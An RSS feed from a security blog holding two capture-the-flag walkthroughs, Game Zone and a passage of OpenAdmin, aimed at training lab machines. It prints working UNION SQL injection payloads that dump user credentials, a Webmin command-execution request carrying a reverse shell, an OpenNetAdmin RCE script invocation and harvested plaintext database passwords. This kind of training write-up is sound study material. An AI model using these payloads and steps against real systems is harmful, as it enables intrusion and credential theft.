<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Easy on 5ysk3y Pwnz</title>
    <link>https://5ysk3y.github.io/tags/easy/</link>
    <description>Recent content in Easy on 5ysk3y Pwnz</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 12 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/tags/easy/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Game Zone - Linux</title>
      <link>https://5ysk3y.github.io/thm/guides/gamezone/</link>
      <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/thm/guides/gamezone/</guid>
      <description>Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone . This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, &lt;a href=&#34;https://tryhackme.com/room/gamezone&#34; target=&#34;_blank&#34;&gt;Gamezone&lt;/a&gt;
. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that. This was a really fun room so, let&amp;rsquo;s go!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;As is standard, we start off our process with an nmap scan to determine what ports we can listen on:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Apr 26 04:38:10 2020 as: nmap -Pn -sC -sV -oA initial -v 10.10.250.216
Nmap scan report for 10.10.250.216
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 26 04:38:24 2020 -- 1 IP address (1 host up) scanned in 14.22 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;As we can see, there&amp;rsquo;s 2 ports Open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH (7.2p2)&lt;/li&gt;
&lt;li&gt;Apache (2.4.18)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The main site on port 80 has no associated CMS - it looks bloody old. There&amp;rsquo;s a login form on the left side thats exploitable via cassic SQL injection, a la &lt;code&gt;admin&#39; OR 1=1 -- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This simple injection allows us to bypass the main login, however once we get to the &amp;ldquo;admin panel&amp;rdquo; there&amp;rsquo;s another SQL injectable form in the guise of a search field - passing this to burpsuite, we can start to enumerate number of columns in the table that&amp;rsquo;s being queried by default; we do this by using  &lt;code&gt;ORDER BY&lt;/code&gt;  and we continue to increment its value until we get an error. The following query was the last I submit &lt;em&gt;before&lt;/em&gt; I recieved an error indicating that, in this case, the target table has 3 colums:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; ORDER BY 3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now we have this information we can then use &lt;code&gt;union&lt;/code&gt; to confirm we can inject information onto the page:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,2,3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This produces &amp;ldquo;1,2,3&amp;rdquo; on the page and we can hijack one of these and replace it with a nested SQL statement or, to test, a string:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,&amp;quot;5ysk3y&amp;quot;,3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This renders the word &lt;code&gt;5ysk3y&lt;/code&gt; on the page in place of the second colmn - if we replace that second value with a mySQL function instead, like &lt;code&gt;user()&lt;/code&gt;, we get &lt;code&gt;root@localhost&lt;/code&gt; printed on the page. So we can now start to enumerate stuff as we can get the page to output it.&lt;/p&gt;
&lt;p&gt;As the room asks us to use SQLMap, I&amp;rsquo;ll set that off while I manually exploit this in tandem. The SQLMap command I used is:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r $(pwd)/search.req --technique=U --batch&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;N.B. As we know its UNION injectable, specifying &lt;code&gt;U&lt;/code&gt; as the technique allows us to target that specifically.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To manually exploit this we can reference the &lt;code&gt;INFORMATION SCHEMA&lt;/code&gt; database in MySQL - this contains stuff that MySQL itself uses to keep things in order, e.g. other database names as well as tonnes of related data - the &lt;code&gt;SCHEMATA&lt;/code&gt; table specifically contains the names of databases MySQL knows about. The following query would extract those:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As mentioned, to run another query as part of the union it needs to be &lt;code&gt;(nested)&lt;/code&gt; and, in order to view everything that matches our query (as there&amp;rsquo;s more than one value returned in the output) we wrap the target table in the group_concat() function. This gets us the following output on the page in place of the second column:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;information_schema, db, mysql, performance_schema, sys&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The schema/sys/mysql databases belong to MySQL, the &lt;code&gt;db&lt;/code&gt; database seems like it will contain data we may want.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/schemata-table.html&#34; target=&#34;_blank&#34;&gt;This&lt;/a&gt;
 is a particularly good reference for finding out what tables within INFORMATION_SCHEMA you can query to get information about other DB&amp;rsquo;s to use for further queries/enumeration.&lt;/p&gt;
&lt;p&gt;As we now have a database to target we can query the names of the tables within that database:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = &#39;db&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gives us the name of the two tables inside this database:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Posts, Users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From there we can start to enumerate the columns within those tables. In this case, I focused on the user table as it&amp;rsquo;s the most interesting:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#39;users&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This shows the following columns:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username, pwd, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which means we can now do some more useful queries, such as:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select username from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gets us a username:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;agent47&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And we can also query the password as well:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select pwd from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which gets us a hash (this is an incomplete version; you&amp;rsquo;ll need to grab it yourself):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ab5db915fc9cea6c78df88106c6500-[truncated]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We could have also got this via SQLMap by including &lt;code&gt;--dump&lt;/code&gt; in our earlier command, but that&amp;rsquo;s less fun. Also, SQLMap did confirm our original suspicions that this was UNION injectable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;sqlmap resumed the following injection point(s) &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; stored &lt;span style=&#34;color:#66d9ef&#34;&gt;session&lt;/span&gt;:
&lt;span style=&#34;color:#75715e&#34;&gt;---
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Parameter&lt;/span&gt;: searchitem (POST)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query
    Title: Generic &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query (&lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; columns
    Payload: searchitem&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;test&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7171,0x654a55516342637965547842506b644e7a43565354614c63756f4368676e70434165736969574c4a,0x7162716a71)-- -
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before moving on we must crack that hash to get our user password. I used John for this, although online tools exist to allow you to reverse it that way if you don&amp;rsquo;t have the facility to crack stuff. Due to THM guide rules, I&amp;rsquo;m not able to include this but, that said, aquiring it isn&amp;rsquo;t all that difficult once you have the hash.&lt;/p&gt;
&lt;p&gt;Success! We get a password. Using the login combination of &lt;code&gt;agent47:&amp;lt;REDACTED&amp;gt;&lt;/code&gt; we can now SSH into the machine and get our user flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Once on the box, we would traditionally enumerate but this is a guided experience so lets stick with the beaten path; running &lt;code&gt;ss&lt;/code&gt; to get a list of listening ports on the box, we see one that stands out due to its number as well as the fact that it didn&amp;rsquo;t appear on our nmap scan:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q           Local Address:Port                  Peer Address:Port
udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:10000                             *:*
udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:68                                *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;                127.0.0.1:3306                      *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:10000                             *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:22                                *:*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::80                               :::*
tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::22                               :::*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this is a table to outline what the arguments denote:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone-ss.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Port 22, 80 and 3306 we can rule out as we know what they are - port 10000, on the other hand, is a little unconventional.&lt;/p&gt;
&lt;p&gt;It doesn&amp;rsquo;t show up on a full port scan so we can assume the firewall is blocking us. We can&amp;rsquo;t quite confirm just yet but it seems likely:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;agent47@gamezone:~$ cat /etc/iptables/rules.v4
cat: /etc/iptables/rules.v4: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to look into this service, we need to use a &lt;em&gt;local&lt;/em&gt; tunnel via SSH to forward the port from the remote box, back to us, so that it&amp;rsquo;s accessible. In order to do this we can run the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ssh -L 10000:127.0.0.1:10000 -f -N agent47@10.10.148.87
agent47@10.10.148.87&#39;s password:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;-f&lt;/code&gt; flag tells the connection to run in the background, and the &lt;code&gt;-N&lt;/code&gt; flag is required with that to tell SSH that no command execution is required (as it is typically expected).&lt;/p&gt;
&lt;p&gt;Initially, to confirm what the port is for, I ran nmap against it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; # nmap -sC -sV -p 10000 -Pn 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 06:33 BST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: MiniServ/1.580
|_http-title: Login to Webmin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And visiting it in a browser confirms that its a web accessible console named &lt;code&gt;webmin&lt;/code&gt; - taking a wild guess via our SSH access to the box (since &lt;code&gt;locate&lt;/code&gt; didn&amp;rsquo;t find anything) I tried &lt;code&gt;/etc/webmin&lt;/code&gt; and found most of the files for that service. The majority were unreadable and owned by root but one of them, a file named &lt;code&gt;version&lt;/code&gt; was not:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;agent47@gamezone:/etc/webmin$ cat version
1.580
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we run this through exploit DB, we will see that there&amp;rsquo;s a metasploit module available to exploit this specific version of webmin:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Webmin 1.580 - &amp;lsquo;/file/show.cgi&amp;rsquo; Remote Command Execution (Metasploit)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we load that up we can see that it&amp;rsquo;s sending encoded payloads via an authenticated session. This leverages a vulnerability in the services show.cgi component allowing an attacker to run commands with root privilages. We first need credentials though - I initialy tried hydra against the form but got myself banned rather quickly, then I stopped being stupid and tried our existing creds for Agent47 and they do work.&lt;/p&gt;
&lt;p&gt;The correct metasploit module is &lt;code&gt;exploit/unix/webapp/webmin_show_cgi_exec&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If we send the module through our burp proxy by running:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set PROXIES http:127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can follow the chain of events for the most part - its a little more complicated as the payload, in this case, is another metasploit module thats encoded and uploaded via the FileManager functionality in Webmin. Effectively it uploads a file and then executes that via &lt;code&gt;sh&lt;/code&gt; - the default payload is &lt;code&gt;cmd/unix/reverse_perl&lt;/code&gt; and this basically consists of a Perl command that will intiiate a reverse shell. This gets dumped into a file thats named using a random set of characters/numbers and then called in the following manner:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /file/show.cgi/bin/UP8Qmwh|sh -c
Host: 127.0.0.1:10000
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: sid=e6b8f4f5ff9b17ac77529c6e91c88667
Content-Type: application/x-www-form-urlencoded
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assuming the file exists and the payload is correct, it&amp;rsquo;ll get executed. I may see if I can supply a manual payload at a later date, for now though Metasploit is the easiest way to handle this.&lt;/p&gt;
&lt;p&gt;This gets you a shell, though, and as the root user non-the-less. From there you can proceed to get the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;All in all, this is a guided room so the difficulty curve will only go so far. In this case, we tried to take it a step further by manual exlpoitation of SQL. Wherever possible, and in line with expectations for the OSCP, I try and refrain from using SQLMap and Metasploit as much as possible. They are one-time/limited use tools in the OSCP exam so becoming reliant on them instead of your own knowledge isn&amp;rsquo;t going to be favorable in the long term. Hopefully this better explains exactly how this is done, as well as detailing how SQLMap itself handle this. In the last stage, manual exploitation wasn&amp;rsquo;t something I dug into due to time but &lt;a href=&#34;http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 URL is referenced within the Metasploit module and outlines, in more detail, how that works.&lt;/p&gt;
&lt;p&gt;None-the-less, this is a great learning experience for anyone that hasn&amp;rsquo;t manually exploited SQLi to this degree before. I hope you enjoyed the read.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>OpenAdmin [Easy] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/openadmin/</link>
      <pubDate>Sat, 02 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/openadmin/</guid>
      <description>Overview OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
 NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:
# Nmap 7.80 scan initiated Sat Jan 4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/openadmin.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s begin by seeing what ports are currently open:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jan  4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=38593%PV=Y%DS=2%DC=T%G=Y%TM=5E10EE11
OS:%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 34.527 days (since Sun Dec  1 07:18:22 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   42.44 ms 10.10.14.
2   42.49 ms 10.10.10.171

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  4 19:57:05 2020 -- 1 IP address (1 host up) scanned in 21.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;In a nutshell, we can see two open ports. Since SSH is up to date and we can&amp;rsquo;t directly compromise it, let&amp;rsquo;s move our attention to the web port. I did an initial Gobuster scan on the IP that also targeted HTML/PHP files  - this found 2 more sub-dir websites:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/index.html (Status: 200)
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/music&lt;/code&gt; and &lt;code&gt;/sierra&lt;/code&gt; seem to be independant sites, neither with anything too interesting present. That said, one of them (/music) had a link to login that points here:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And this is vulnerable to a certain exploit:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;OpenNetAdmin 18.1.1 - Remote Code Execution&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This script requires dos2unix running on it prior to use because of weird character breaks etc but it works as intended out the box. I hijacked an existing reverse-shell script on the server, replacing the port and my IP with sed. Also opened up 9001 on the firewall as its locked down by default. Running the script via the browser got me a rev shell:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/bin/bash ./47691.sh 10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once on the box I had a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file and found the following 2 users with shell access, aside from root:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Jimmy&lt;/li&gt;
&lt;li&gt;Joanna&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then ran linpeas as the www-data user. Most of the interesting stuff appears to to be in the ONA (OpenNetAdmin) dir, i.e. /opt/ona. In here we got some DB creds:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;database_settings.inc.php&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$ona_contexts=array (
  &#39;DEFAULT&#39; =&amp;gt;
  array (
    &#39;databases&#39; =&amp;gt;
    array (
      0 =&amp;gt;
      array (
        &#39;db_type&#39; =&amp;gt; &#39;mysqli&#39;,
        &#39;db_host&#39; =&amp;gt; &#39;localhost&#39;,
        &#39;db_login&#39; =&amp;gt; &#39;ona_sys&#39;,
        &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;,
        &#39;db_database&#39; =&amp;gt; &#39;ona_default&#39;,
        &#39;db_debug&#39; =&amp;gt; false,
      ),
    ),
    &#39;description&#39; =&amp;gt; &#39;Default data context&#39;,
    &#39;context_color&#39; =&amp;gt; &#39;#D3DBFF&#39;,
  ),
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Testing this pass with one of the 2 available users; we get access as &lt;em&gt;Jimmy&lt;/em&gt;. I also tried as the Joanna user but that failed. So we have one login:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;jimmy:n1nj4W4rri0R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Theres a folder named &lt;code&gt;internal&lt;/code&gt; within &lt;code&gt;/var/www&lt;/code&gt; and its owned by Jimmy - only he and the &lt;code&gt;internal&lt;/code&gt; group can access it so www-data cannot. Theres also a few PHP pages in here - they can be viewed directly by running a PHP server:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;php -S [ip:port]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Viewing this you can see that it&amp;rsquo;s a login page that takes you to a page containing a &lt;code&gt;shell_exec&lt;/code&gt; statement. The code itself thankfully contians the password to get past the login form: &lt;code&gt;Revealed&lt;/code&gt; - this was a SHA-512 hash that I cracked via hashes.org.  For testing I also did this via JTR on the my new, totally original, not-ippsec-inspired-what-so-ever, kracken rig:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kracken:~/hashes/htb/openadmin# john --show --format=Raw-SHA512 hash
jimmy:Revealed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The problem with the exec statement is that it runs as as the user thats running the file, i.e. Jimmy, so I couldn&amp;rsquo;t initially see how I&amp;rsquo;d be able to leverage it. Even more annoyingly the default exec command is a cat request to Joanna&amp;rsquo;s id_rsa file, so it&amp;rsquo;s like a double taunt.&lt;/p&gt;
&lt;p&gt;Digging further, I eventually noticed that the internal group shares both Jimmy and Joanna as common members:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy@openadmin:/home$ cat /etc/group | grep -i internal
internal:x:1002:jimmy,joanna
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at listening ports on the machine we can also see something else interesting:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy@openadmin:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:52846               :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A unique local port (52846) is listening - curling it from the machine shows a page very similar to the one mentoned above in the internal folder. The problem is we cant access that port from our side to view the page via something like firefox. Except we can, using SSH port forwarding of course. I did this in the following manner:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Login to the box via the usual means.&lt;/li&gt;
&lt;li&gt;On a brand new line press: &lt;code&gt;Shift&lt;/code&gt; + &lt;code&gt;~&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; to drop into an interactive SSH prompt.&lt;/li&gt;
&lt;li&gt;Forward in the following manner:&lt;/li&gt;
&lt;/ol&gt;
